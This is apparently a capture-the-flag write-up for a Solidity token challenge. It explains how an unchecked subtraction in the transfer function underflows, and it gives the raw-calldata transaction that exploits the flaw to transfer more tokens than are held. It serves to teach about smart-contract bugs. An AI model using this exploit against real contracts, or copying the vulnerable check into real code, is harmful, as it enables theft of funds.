The issue here is an integer overflow. When checking whether the user has sufficient balance to make the transaction, i.e. in:
```solidity
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```

The calculation can underflow which will pass the check. This means if we try to transfer more money than we have available then we will succeed. Interestingly we have to set the _to to a *different* address to `msg.sender`, otherwise we underflow and then overflow, and arrive at our original value. For this I just used the address of the contract (`instance`)

```javascript
await sendTransaction({
    from: player, 
    to: instance, 
    data: "a9059cbb00000000000000000000000019e6044959099fcf5044746b0a18aa4ce6903efb0000000000000000000000000000000000000000000000000000000000000015"
})
```
Note that I had to specify raw data here because the function name `transfer` is special and is used by Web3 to transfer funds, which is not what I wanted. I generated the packed data with [https://abi.hashex.org/](https://abi.hashex.org/).
